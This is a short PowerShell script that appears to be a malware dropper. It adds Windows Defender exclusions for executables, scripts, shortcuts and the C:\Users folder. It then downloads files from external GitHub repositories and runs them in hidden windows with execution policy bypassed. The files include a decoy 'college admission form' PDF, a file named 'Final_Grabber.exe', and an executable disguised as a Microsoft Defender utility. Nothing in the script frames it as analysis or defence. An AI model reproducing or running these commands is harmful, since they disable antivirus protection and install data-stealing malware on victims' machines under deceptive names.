powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/all/raw/main/Gift%20College%20Admision%20Form%202023.pdf -o C:\Users\gift.pdf
powershell.exe -w Hidden C:\Users\gift.pdf

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf.exe
powershell.exe -w Hidden C:\Users\pdf.exe

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\internet.exe
powershell.exe -w Hidden C:\Users\internet.exe

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe






